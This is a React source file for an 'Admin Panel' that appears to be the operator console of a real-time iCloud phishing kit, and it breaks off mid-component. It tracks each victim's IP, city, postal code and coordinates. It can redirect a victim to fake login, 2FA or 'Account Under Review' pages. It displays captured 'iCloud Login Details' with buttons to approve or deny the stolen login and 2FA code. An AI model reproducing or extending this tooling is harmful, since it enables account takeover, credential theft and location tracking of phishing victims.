'use client';

import { useState, useEffect, useMemo, useRef } from 'react';
import {
    RefreshCw,
    ChevronLeft,
    ChevronRight,
    ChevronDown,
    Globe,
    MapPin,
    Clock,
    Wifi,
    Smartphone,
    Flag,
    AlertCircle,
    Shield,
    User,
    Lock,
    Copy,
    ExternalLink,
    Globe2,
    MapPinOff,
    Building,
    Mail,
    Calendar,
    Info,
    Server,
    Network,
    Hash
} from 'lucide-react';
import io from 'socket.io-client';
import {
    Sheet,
    SheetClose,
    SheetContent,
    SheetDescription,
    SheetFooter,
    SheetHeader,
    SheetTitle,
    SheetTrigger,
} from "@/components/ui/sheet";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

export default function Panel() {
    const [socket, setSocket] = useState(null);
    const [connections, setConnections] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [authError, setAuthError] = useState(null);
    const [currentPage, setCurrentPage] = useState(1);
    const [itemsPerPage, setItemsPerPage] = useState(20);
    const [searchTerm, setSearchTerm] = useState('');
    const [sortBy, setSortBy] = useState('connectedAt');
    const [sortOrder, setSortOrder] = useState('desc');
    const [lastUpdated, setLastUpdated] = useState(null);
    const [isAdmin, setIsAdmin] = useState(false);
    const [socketId, setSocketId] = useState(null);
    const [redirectUrl, setRedirectUrl] = useState('');
    const [selectedRedirectPage, setSelectedRedirectPage] = useState('');
    const [stats, setStats] = useState({
        total: 0,
        adminCount: 0,
        userCount: 0
    });
    const [selectedConnection, setSelectedConnection] = useState(null);
    const prevConnectionsRef = useRef([])
    const hasInitiallyLoaded = useRef(false)

    const handleRedirectPage = (socketId, page) => {
        if (socket && socketId && page) {
            socket.emit("redirectPage", {
                socketId: socketId,
                page: page
            });
        }
    };

    useEffect(() => {
        if (!socket || !socket.connected || !isAdmin) return;

        const interval = setInterval(() => {
            fetchConnections();
        }, 2000);

        return () => clearInterval(interval);
    }, [socket, isAdmin]);

    const getToken = () => {
        if (typeof window !== 'undefined') {
            return localStorage.getItem('adminToken');
        }
        return null;
    };

    useEffect(() => {
        const token = getToken();

        if (!token) {
            setAuthError('No admin token found. Please login.');
            setLoading(false);
            return;
        }

        console.log('🔌 Connecting to socket server with token...');

        const socketConnection = io('https://socket.nocsam.org', {
            auth: {
                token: token
            },
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 5
        });

        socketConnection.on('connect', () => {
            console.log('Socket connected:', socketConnection.id);
            setSocketId(socketConnection.id);
            setAuthError(null);
        });

        socketConnection.on('welcome', (data) => {
            console.log('Welcome from server:', data);
            setIsAdmin(data.isAdmin || false);

            if (!data.isAdmin) {
                setAuthError('You are not authorized as admin');
            }
        });

        socketConnection.on('connect_error', (error) => {
            console.log('Socket connection error:', error.message);
            setAuthError(`Connection failed: ${error.message}`);
            setLoading(false);
        });

        socketConnection.on('disconnect', (reason) => {
            console.log('Socket disconnected:', reason);
            setSocketId(null);
        });

        setSocket(socketConnection);

        return () => {
            console.log('Cleaning up socket connection');
            if (socketConnection) {
                socketConnection.disconnect();
            }
        };
    }, []);

    const fetchConnections = (isManual = false) => {
        if (!socket || !socket.connected) {
            setError('Socket not connected');
            return;
        }

        if (!isAdmin) {
            setError('Admin access required');
            return;
        }

        if (!hasInitiallyLoaded.current || isManual) {
            setLoading(true);
        }
        setError(null);

        socket.emit('getAll', (response) => {
            if (!hasInitiallyLoaded.current || isManual) {
                setLoading(false);
                hasInitiallyLoaded.current = true;
            }

            if (response.success) {
                setConnections(prev => {
                    const updated = response.connections.map(newConn => {
                        const existing = prev.find(c => c.id === newConn.id)
                        return existing ? { ...existing, ...newConn, isActive: true } : newConn;
                    });

                    const removed = prev.filter(prevConn =>
                        !response.connections.find(c => c.id === prevConn.id)
                    ).map(conn => ({ ...conn, isActive: false }))

                    return [...updated, ...removed]
                });

                setSelectedConnection(prev => {
                    if (!prev) return null;
                    const freshData = response.connections.find(c => c.id === prev.id);
                    if (freshData) {
                        return { ...prev, ...freshData, isActive: true };
                    }
                    return { ...prev, isActive: false };
                });

                setStats({
                    total: response.total,
                    adminCount: response.adminCount,
                    userCount: response.connections.length
                });
                setLastUpdated(response.timestamp);
            } else {
                setError(response.error || 'Failed to fetch connections');
            }
        });
    };

    useEffect(() => {
        if (socket && socket.connected && isAdmin) {
            fetchConnections();
        }
    }, [socket, isAdmin]);

    const filteredConnections = useMemo(() => {
        let filtered = [...connections];
        if (searchTerm) {
            const term = searchTerm.toLowerCase();
            filtered = filtered.filter(conn =>
                conn.id?.toLowerCase().includes(term) ||
                conn.userAgent?.toLowerCase().includes(term) ||
                conn.geoData?.ip?.toLowerCase().includes(term) ||
                conn.geoData?.city?.toLowerCase().includes(term) ||
                conn.geoData?.country?.toLowerCase().includes(term) ||
                conn.geoData?.org?.toLowerCase().includes(term)
            );
        }

        filtered.sort((a, b) => {
            let aValue, bValue;

            if (sortBy === 'connectedAt') {
                aValue = a.connectedAt || 0;
                bValue = b.connectedAt || 0;
            } else if (sortBy === 'country') {
                aValue = a.geoData?.country || '';
                bValue = b.geoData?.country || '';
            } else if (sortBy === 'city') {
                aValue = a.geoData?.city || '';
                bValue = b.geoData?.city || '';
            } else if (sortBy === 'ip') {
                aValue = a.geoData?.ip || '';
                bValue = b.geoData?.ip || '';
            } else {
                aValue = a[sortBy] || '';
                bValue = b[sortBy] || '';
            }

            if (sortOrder === 'asc') {
                return aValue > bValue ? 1 : -1;
            } else {
                return aValue < bValue ? 1 : -1;
            }
        });

        return filtered;
    }, [connections, searchTerm, sortBy, sortOrder]);

    // Pagination calculations
    const totalPages = Math.ceil(filteredConnections.length / itemsPerPage);
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const paginatedConnections = filteredConnections.slice(startIndex, endIndex);

    // Format date
    const formatDate = (timestamp) => {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp);
        return date.toLocaleTimeString([], {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });
    };

    // Format full date
    const formatFullDate = (timestamp) => {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp);
        return date.toLocaleString();
    };

    // Get flag emoji from country code
    const getFlagEmoji = (countryCode) => {
        if (!countryCode || countryCode.length !== 2) return '🏴';
        return `https://flagsapi.com/${countryCode.toUpperCase()}/shiny/64.png`;
    };

    // Format time ago
    const formatTimeAgo = (timestamp) => {
        if (!timestamp) return '';
        const seconds = Math.floor((Date.now() - timestamp) / 1000);

        if (seconds < 60) return `${seconds}s ago`;
        if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
        if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
        return `${Math.floor(seconds / 86400)}d ago`;
    };

    // Handle sort
    const handleSort = (column) => {
        if (sortBy === column) {
            setSortOrder(sortOrder === 'asc' ? 'desc' : 'asc');
        } else {
            setSortBy(column);
            setSortOrder('asc');
        }
        setCurrentPage(1);
    };

    // Render sort indicator
    const renderSortIndicator = (column) => {
        if (sortBy !== column) return null;
        return (
            <ChevronDown
                className={`inline ml-1 w-4 h-4 transition-transform ${sortOrder === 'desc' ? 'rotate-180' : ''
                    }`}
            />
        );
    };

    // Handle login redirect
    const handleLoginRedirect = () => {
        window.location.href = '/icloudadmin';
    };

    // Handle logout
    const handleLogout = () => {
        localStorage.removeItem('adminToken');
        window.location.reload();
    };

    // Copy to clipboard
    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text).then(() => {
            // You could add a toast notification here
            console.log('Copied to clipboard:', text);
        });
    };

    // Open in new tab
    const openInNewTab = (url) => {
        window.open(url, '_blank', 'noopener,noreferrer');
    };

    // Handle sheet open
    const handleSheetOpen = (connection) => {
        setSelectedConnection(connection);
    };

    // Get coordinates link
    const getCoordinatesLink = (loc) => {
        if (!loc) return '#';
        const [lat, lng] = loc.split(',');
        return `https://maps.google.com/?q=${lat},${lng}`;
    };

    // Get IP info link
    const getIPInfoLink = (ip) => {
        if (!ip || ip === 'N/A') return '#';
        return `https://ipinfo.io/${ip}`;
    };

    if (authError) {
        return (
            <div className="min-h-screen bg-[#171717] flex items-center justify-center p-4">
                <div className="max-w-md w-full bg-[#1c1c1c] border border-[#333] rounded-lg p-8 text-center">
                    <Lock className="w-16 h-16 text-red-500 mx-auto mb-4" />
                    <h2 className="text-2xl font-bold text-white mb-2">Authentication Required</h2>
                    <p className="text-gray-400 mb-6">{authError}</p>
                    <div className="flex gap-3">
                        <button
                            onClick={handleLoginRedirect}
                            className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
                        >
                            Go to Login
                        </button>
                        <button
                            onClick={() => window.location.reload()}
                            className="flex-1 py-2 bg-[#262626] hover:bg-[#333] text-gray-300 rounded-lg transition-colors"
                        >
                            Retry
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#171717] text-gray-200 p-4 md:p-6">
            {/* Header */}
            <div className="mb-6">
                <div className="flex flex-col md:flex-row md:items-center justify-between mb-4 gap-4">
                    <div className="flex items-center gap-3">
                        <div>
                            <h1 className="text-2xl md:text-3xl font-bold text-white mb-1">
                                Admin Panel
                            </h1>
                            <p className="text-sm md:text-base text-gray-400">
                                Real-time monitoring of user connections
                            </p>
                        </div>
                    </div>

                    <div className="flex flex-wrap items-center gap-3">
                        {/* Connection status */}
                        <div className={`px-3 py-1 rounded-full text-xs ${socketId ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'
                            }`}>
                            {socketId ? `Connected` : 'Disconnected'}
                        </div>

                        {/* Refresh button */}
                        <button
                            onClick={() => fetchConnections(true)}
                            disabled={loading || !socket?.connected}
                            className="flex items-center gap-2 px-3 py-2 bg-[#262626] hover:bg-[#333] rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
                            {loading ? 'Refreshing...' : 'Refresh'}
                        </button>

                        {/* Delete All button */}
                        <button
                            onClick={() => {
                                const allIds = connections.filter(c => c.isActive).map(c => c.id);
                                if (allIds.length > 0 && socket) {
                                    socket.emit('delete', { ids: allIds });
                                }
                            }}
                            disabled={!socket?.connected || connections.filter(c => c.isActive).length === 0}
                            className="flex items-center gap-2 px-3 py-2 bg-red-600/20 hover:bg-red-600/30 border border-red-700/30 text-red-400 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            Delete All
                        </button>

                        {/* Logout button */}
                        <button
                            onClick={handleLogout}
                            className="px-3 py-2 bg-red-600/20 hover:bg-red-600/30 border border-red-700/30 text-red-400 rounded-lg transition-colors"
                        >
                            Logout
                        </button>
                    </div>
                </div>

                {/* Error display */}
                {error && (
                    <div className="mb-4 p-3 bg-red-900/20 border border-red-700/50 rounded-lg flex items-center gap-2">
                        <AlertCircle className="w-5 h-5 text-red-400" />
                        <span className="text-red-300">{error}</span>
                        <button
                            onClick={fetchConnections}
                            className="ml-auto text-sm text-red-300 hover:text-red-200"
                        >
                            Retry
                        </button>
                    </div>
                )}

                {/* Controls */}
                <div className="flex flex-wrap items-center gap-3 p-3 bg-[#1c1c1c] rounded-lg">
                    {/* Search */}
                    <div className="flex-1 min-w-[200px]">
                        <input
                            type="text"
                            placeholder="Search connections..."
                            value={searchTerm}
                            onChange={(e) => {
                                setSearchTerm(e.target.value);
                                setCurrentPage(1);
                            }}
                            className="w-full px-3 py-2 bg-[#262626] border border-[#333] rounded-lg focus:outline-none focus:ring-1 focus:ring-[#444] text-sm"
                        />
                    </div>

                    {/* Items per page */}
                    <div className="flex items-center gap-2">
                        <span className="text-xs text-gray-400 whitespace-nowrap">Show:</span>
                        <select
                            value={itemsPerPage}
                            onChange={(e) => {
                                setItemsPerPage(Number(e.target.value));
                                setCurrentPage(1);
                            }}
                            className="px-2 py-1 bg-[#262626] border border-[#333] rounded-lg focus:outline-none focus:ring-1 focus:ring-[#444] text-sm"
                        >
                            <option value={10}>10</option>
                            <option value={20}>20</option>
                            <option value={50}>50</option>
                            <option value={100}>100</option>
                        </select>
                    </div>

                    {/* Stats */}
                    <div className="flex items-center gap-3 text-sm">
                        <div className="px-2 py-1 bg-[#262626] rounded">
                            <span className="text-gray-400">Users:</span>
                            <span className="ml-1 font-bold text-white">{stats.userCount}</span>
                        </div>
                        <div className="px-2 py-1 bg-[#262626] rounded">
                            <span className="text-gray-400">Filtered:</span>
                            <span className="ml-1 font-bold text-white">{filteredConnections.length}</span>
                        </div>
                    </div>
                </div>
            </div>

            {/* Connections Table */}
            <div className="bg-[#1c1c1c] rounded-lg overflow-hidden border border-[#333]">
                {loading ? (
                    <div className="flex items-center justify-center h-64">
                        <div className="text-center">
                            <RefreshCw className="w-8 h-8 animate-spin mx-auto mb-4 text-gray-500" />
                            <p className="text-gray-400">Loading connections...</p>
                        </div>
                    </div>
                ) : paginatedConnections.length === 0 ? (
                    <div className="flex items-center justify-center h-64">
                        <div className="text-center">
                            <Wifi className="w-12 h-12 mx-auto mb-4 text-gray-600" />
                            <p className="text-gray-400 text-lg">No user connections found</p>
                            {searchTerm && (
                                <p className="text-gray-500 text-sm mt-2">
                                    Try adjusting your search term
                                </p>
                            )}
                        </div>
                    </div>
                ) : (
                    <>
                        <div className="overflow-x-auto">
                            <table className="w-full min-w-[1000px]">
                                <thead>
                                    <tr className="bg-[#262626] border-b border-[#333]">
                                        <th
                                            className="py-3 px-3 text-left text-xs font-medium text-gray-300 cursor-pointer hover:bg-[#333] transition-colors"
                                            onClick={() => handleSort('country')}
                                        >
                                            <div className="flex items-center">
                                                <Flag className="w-3 h-3 mr-1" />
                                                Flag
                                                {renderSortIndicator('country')}
                                            </div>
                                        </th>
                                        <th
                                            className="py-3 px-3 text-left text-xs font-medium text-gray-300 cursor-pointer hover:bg-[#333] transition-colors"
                                            onClick={() => handleSort('userAgent')}
                                        >
                                            <div className="flex items-center">
                                                <Smartphone className="w-3 h-3 mr-1" />
                                                User Agent
                                                {renderSortIndicator('userAgent')}
                                            </div>
                                        </th>
                                        <th
                                            className="py-3 px-3 text-left text-xs font-medium text-gray-300 cursor-pointer hover:bg-[#333] transition-colors"
                                            onClick={() => handleSort('refid')}
                                        >
                                            <div className="flex items-center">
                                                Reference ID
                                                {renderSortIndicator('refid')}
                                            </div>
                                        </th>

                                        <th
                                            className="py-3 px-3 text-left text-xs font-medium text-gray-300 cursor-pointer hover:bg-[#333] transition-colors"
                                            onClick={() => handleSort('page')}
                                        >
                                            <div className="flex items-center">
                                                Page
                                            </div>
                                        </th>
                                        <th
                                            className="py-3 px-3 text-left text-xs font-medium text-gray-300 cursor-pointer hover:bg-[#333] transition-colors"
                                            onClick={() => handleSort('ip')}
                                        >
                                            <div className="flex items-center">
                                                <Globe className="w-3 h-3 mr-1" />
                                                IP Address
                                                {renderSortIndicator('ip')}
                                            </div>
                                        </th>
                                        <th
                                            className="py-3 px-3 text-left text-xs font-medium text-gray-300 cursor-pointer hover:bg-[#333] transition-colors"
                                            onClick={() => handleSort('city')}
                                        >
                                            <div className="flex items-center">
                                                <MapPin className="w-3 h-3 mr-1" />
                                                City
                                                {renderSortIndicator('city')}
                                            </div>
                                        </th>
                                        <th className="py-3 px-3 text-left text-xs font-medium text-gray-300">
                                            Location
                                        </th>
                                        <th className="py-3 px-3 text-left text-xs font-medium text-gray-300">
                                            Timezone
                                        </th>
                                        <th
                                            className="py-3 px-3 text-left text-xs font-medium text-gray-300 cursor-pointer hover:bg-[#333] transition-colors"
                                            onClick={() => handleSort('connectedAt')}
                                        >
                                            <div className="flex items-center">
                                                <Clock className="w-3 h-3 mr-1" />
                                                Connected
                                                {renderSortIndicator('connectedAt')}
                                            </div>
                                        </th>
                                        <th className="py-3 px-3 text-left text-xs font-medium text-gray-300">
                                            Action
                                        </th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {paginatedConnections.map((conn, index) => (
                                        <tr
                                            key={conn.id}
                                            className={`border-b border-[#333] transition-all duration-300 ${index % 2 === 0 ? 'bg-[#1c1c1c]' : 'bg-[#171717]'} ${conn.isActive ? 'opacity-100' : 'opacity-60'}`}
                                        >
                                            <td className="py-3 px-3">
                                                <div className="flex items-center">
                                                    <img
                                                        src={getFlagEmoji(conn.geoData?.country) || "/placeholder.svg"}
                                                        alt="Flag"
                                                        className="w-6 h-6 mr-2 rounded-sm"
                                                    />
                                                    <span className="text-xs text-gray-300">
                                                        {conn.geoData?.country || 'N/A'}
                                                    </span>
                                                </div>
                                            </td>

                                            <td className="py-3 px-3">
                                                <div className="max-w-[200px]">
                                                    <div
                                                        className="text-xs text-gray-300 truncate"
                                                        title={conn.userAgent || 'No user agent'}
                                                    >
                                                        {conn.userAgent || 'N/A'}
                                                    </div>
                                                    <div className="text-[10px] text-gray-500 mt-0.5 font-mono">
                                                        {conn.id?.substring(0, 12)}...
                                                    </div>
                                                </div>
                                            </td>
                                            <td className="py-3 px-3">
                                                <div className="max-w-[200px]">
                                                    <div
                                                        className="text-xs text-gray-300 truncate"
                                                        title={conn.id || 'No page'}
                                                    >
                                                        {Array.from(conn.id).reduce((acc, char) => acc + char.charCodeAt(0) * 100, 0).toString().slice(0, 6)}
                                                    </div>
                                                </div>
                                            </td>
                                            <td className="py-3 px-3">
                                                <div className="max-w-[200px]">
                                                    <div
                                                        className="text-xs text-gray-300 truncate"
                                                        title={conn.currentPage || 'No page'}
                                                    >
                                                        {conn.currentPage || 'N/A'}
                                                    </div>
                                                </div>
                                            </td>


                                            {/* IP */}
                                            <td className="py-3 px-3">
                                                <div className="text-xs text-gray-300 font-mono">
                                                    {conn.geoData?.ip || 'N/A'}
                                                </div>
                                                {conn.geoData?.org && (
                                                    <div className="text-[10px] text-gray-500 truncate max-w-[150px]"
                                                        title={conn.geoData.org}>
                                                        {conn.geoData.org}
                                                    </div>
                                                )}
                                            </td>

                                            {/* City */}
                                            <td className="py-3 px-3">
                                                <div>
                                                    <div className="text-xs text-gray-300">
                                                        {conn.geoData?.city || 'N/A'}
                                                    </div>
                                                    <div className="text-[10px] text-gray-500">
                                                        {conn.geoData?.region || ''}
                                                    </div>
                                                </div>
                                            </td>

                                            {/* Location */}
                                            <td className="py-3 px-3">
                                                <div className="text-xs text-gray-300 font-mono">
                                                    {conn.geoData?.loc || 'N/A'}
                                                </div>
                                            </td>

                                            {/* Timezone */}
                                            <td className="py-3 px-3">
                                                <div className="text-xs text-gray-300">
                                                    {conn.geoData?.timezone?.split('/').pop() || 'N/A'}
                                                </div>
                                            </td>

                                            {/* Connected At */}
                                            <td className="py-3 px-3">
                                                <div>
                                                    <div className="text-xs text-gray-300 whitespace-nowrap">
                                                        {formatDate(conn.connectedAt)}
                                                    </div>
                                                    <div className="text-[10px] text-gray-500">
                                                        {conn.isActive ? (
                                                            <span className="flex items-center">
                                                                <span className="w-1.5 h-1.5 bg-green-500 rounded-full mr-1"></span>
                                                                Active
                                                            </span>
                                                        ) : (
                                                            <span className="text-red-400">Inactive</span>
                                                        )}
                                                    </div>
                                                </div>
                                            </td>

                                            {/* Action */}
                                            <td className="py-3 px-3">
                                                <div className="flex items-center gap-1">
                                                    <button
                                                        onClick={() => {
                                                            if (socket) {
                                                                socket.emit('delete', { ids: [conn.id] });
                                                            }
                                                        }}
                                                        className="p-1.5 hover:bg-red-600/30 rounded transition-colors group"
                                                        title="Delete connection"
                                                    >
                                                        <svg xmlns="http://www.w3.org/2000/svg" className="w-4 h-4 text-gray-400 group-hover:text-red-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M3 6h18" /><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6" /><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2" /></svg>
                                                    </button>
                                                    <Sheet>
                                                        <SheetTrigger asChild>
                                                            <button
                                                                onClick={() => handleSheetOpen(conn)}
                                                                className="p-1.5 hover:bg-[#333] rounded transition-colors group"
                                                                title="View details"
                                                            >
                                                                <ChevronRight className="w-4 h-4 text-gray-400 group-hover:text-white" />
                                                            </button>
                                                        </SheetTrigger>
                                                        <SheetContent
                                                            side="right"
                                                            className="w-full sm:max-w-xl bg-[#1c1c1c] border-l border-[#333] overflow-y-auto p-6"
                                                        >
                                                            {selectedConnection && (
                                                                <>
                                                                    <SheetHeader className="mb-6">
                                                                        <div className="flex items-center gap-3">
                                                                            <img
                                                                                src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"}
                                                                                alt="Flag"
                                                                                className="w-8 h-8 rounded-sm"
                                                                            />
                                                                            <div>
                                                                                <SheetTitle className="text-white">
                                                                                    Connection Details
                                                                                </SheetTitle>
                                                                                <SheetDescription className="text-gray-400">
                                                                                    ID: {selectedConnection.id}
                                                                                </SheetDescription>
                                                                            </div>
                                                                        </div>
                                                                    </SheetHeader>

                                                                    <div className="space-y-6">
                                                                        <div className="space-y-4">
                                                                            <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                                                                                <Info className="w-5 h-5" />
                                                                                Basic Information
                                                                            </h3>

                                                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Socket ID</Label>
                                                                                    <div className="flex items-center gap-2">
                                                                                        <Input
                                                                                            value={selectedConnection.id}
                                                                                            readOnly
                                                                                            className="bg-[#262626] border-[#333] text-gray-300 font-mono text-sm"
                                                                                        />
                                                                                    </div>
                                                                                </div>

                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Status</Label>
                                                                                    <div className={`px-3 py-1.5 rounded text-sm ${selectedConnection.isActive ? 'bg-green-900/30 text-green-400 border border-green-700/30' : 'bg-red-900/30 text-red-400 border border-red-700/30'}`}>
                                                                                        {selectedConnection.isActive ? 'Active' : 'Inactive'}
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div className="space-y-2">
                                                                                <Label className="text-gray-400 text-sm">User Agent</Label>
                                                                                <div className="p-3 bg-[#262626] border border-[#333] rounded text-sm text-gray-300">
                                                                                    {selectedConnection.userAgent || 'Not available'}
                                                                                </div>
                                                                            </div>
                                                                        </div>

                                                                        {/* Location Section */}
                                                                        <div className="space-y-4">
                                                                            <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                                                                                <MapPin className="w-5 h-5" />
                                                                                Location Information
                                                                            </h3>

                                                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">IP Address</Label>
                                                                                    <div className="flex items-center gap-2">
                                                                                        <Input
                                                                                            value={selectedConnection.geoData?.ip || 'N/A'}
                                                                                            readOnly
                                                                                            className="bg-[#262626] border-[#333] text-gray-300 font-mono text-sm"
                                                                                        />
                                                                                        <Button
                                                                                            size="sm"
                                                                                            variant="outline"
                                                                                            onClick={() => openInNewTab(getIPInfoLink(selectedConnection.geoData?.ip))}
                                                                                            className="bg-[#262626] border-[#333] text-white hover:text-white hover:bg-[#333]"
                                                                                            disabled={!selectedConnection.geoData?.ip}
                                                                                        >
                                                                                            <ExternalLink className="w-4 h-4" />
                                                                                        </Button>
                                                                                    </div>
                                                                                </div>


                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Country</Label>
                                                                                    <div className="flex items-center gap-3 p-2 bg-[#262626] border border-[#333] rounded">
                                                                                        <img
                                                                                            src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"}
                                                                                            alt="Flag"
                                                                                            className="w-6 h-6"
                                                                                        />
                                                                                        <span className="text-gray-300">
                                                                                            {selectedConnection.geoData?.country || 'N/A'}
                                                                                        </span>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">City</Label>
                                                                                    <Input
                                                                                        value={`${selectedConnection.geoData?.city || 'N/A'}, ${selectedConnection.geoData?.region || ''}`}
                                                                                        readOnly
                                                                                        className="bg-[#262626] border-[#333] text-gray-300"
                                                                                    />
                                                                                </div>

                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Postal Code</Label>
                                                                                    <Input
                                                                                        value={selectedConnection.geoData?.postal || 'N/A'}
                                                                                        readOnly
                                                                                        className="bg-[#262626] border-[#333] text-gray-300"
                                                                                    />
                                                                                </div>
                                                                            </div>

                                                                            <div className="space-y-2">
                                                                                <Label className="text-gray-400 text-sm">Coordinates</Label>
                                                                                <div className="flex items-center gap-2">
                                                                                    <Input
                                                                                        value={selectedConnection.geoData?.loc || 'N/A'}
                                                                                        readOnly
                                                                                        className="bg-[#262626] border-[#333] text-gray-300 font-mono text-sm"
                                                                                    />
                                                                                    <Button
                                                                                        size="sm"
                                                                                        variant="outline"
                                                                                        onClick={() => openInNewTab(getCoordinatesLink(selectedConnection.geoData?.loc))}
                                                                                        className="bg-[#262626] border-[#333] hover:bg-[#333]"
                                                                                        disabled={!selectedConnection.geoData?.loc}
                                                                                    >
                                                                                        <MapPinOff className="w-4 h-4 text-white" />
                                                                                    </Button>
                                                                                </div>
                                                                            </div>

                                                                            {/* Redirect Page */}
                                                                            <div className="space-y-2">
                                                                                <Label className="text-gray-400 text-sm">Redirect Page</Label>
                                                                                <div className="flex items-center gap-2">
                                                                                    <select
                                                                                        value={selectedRedirectPage}
                                                                                        onChange={(e) => setSelectedRedirectPage(e.target.value)}
                                                                                        className="w-full px-3 py-2 bg-[#262626] border border-[#333] rounded-lg focus:outline-none focus:ring-1 focus:ring-[#444] text-sm text-gray-300"
                                                                                    >
                                                                                        <option value="">Select page</option>
                                                                                        <option value="landingPage">Landing Page</option>
                                                                                        <option value="loginPage">Login Page</option>
                                                                                        <option value="2faPage">2FA Page</option>
                                                                                        <option value="AURPage">Account Under Review Page</option>
                                                                                    </select>
                                                                                    <Button
                                                                                        size="sm"
                                                                                        onClick={() => handleRedirectPage(selectedConnection.id, selectedRedirectPage)}
                                                                                        disabled={!selectedRedirectPage}
                                                                                        className="bg-blue-600 hover:bg-blue-700 text-white whitespace-nowrap"
                                                                                    >
                                                                                        Send
                                                                                    </Button>
                                                                                </div>
                                                                            </div>
                                                                        </div>

                                                                        {selectedConnection.loginData ? (
                                                                            <div className="space-y-4">
                                                                                <div className="flex items-center justify-between">
                                                                                    <Label className="text-gray-400 text-sm">iCloud Login Details</Label>
                                                                                    <div className="flex gap-2">
                                                                                        {selectedConnection.loginData.twoFactorCode ? (
                                                                                            <>
                                                                                                <button
                                                                                                    onClick={() => socket.emit('approve2fa', { socketId: selectedConnection.id })}
                                                                                                    className="px-3 py-1.5 text-sm bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors flex items-center gap-1"
                                                                                                >
                                                                                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                                                                                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                                                                                                    </svg>
                                                                                                    Approve 2FA
                                                                                                </button>
                                                                                                <button
                                                                                                    onClick={() => socket.emit('deny2fa', { socketId: selectedConnection.id })}
                                                                                                    className="px-3 py-1.5 text-sm bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors flex items-center gap-1"
                                                                                                >
                                                                                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                                                                                        <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
                                                                                                    </svg>
                                                                                                    Deny 2FA
                                                                                                </button>
                                                                                            </>
                                                                                        ) : (
                                                                                            <>
                                                                                                <button
                                                                                                    onClick={() => socket.emit('approveSignIn', { socketId: selectedConnection.id })}
                                                                                                    className="px-3 py-1.5 text-sm bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors flex items-center gap-1"
                                                                                                >
                                                                                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                                                                                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                                                                                                    </svg>
                                                                                                    Approve Login
                                                                                                </button>
                                                                                                <button
                                                                                                    onClick={() => socket.emit('denySignIn', { socketId: selectedConnection.id })}
                                                                                                    className="px-3 py-1.5 text-sm bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors flex items-center gap-1"
                                                                                                >
                                                                                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                                                                                        <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
                                                                                                    </svg>
                                                                                                    Deny Login
                                                                                                </button>
                                                                                            </>
                                                                                        )}
                                                                                    </div>
                                                                                </div>

                                                                                <div className="space-y-2">
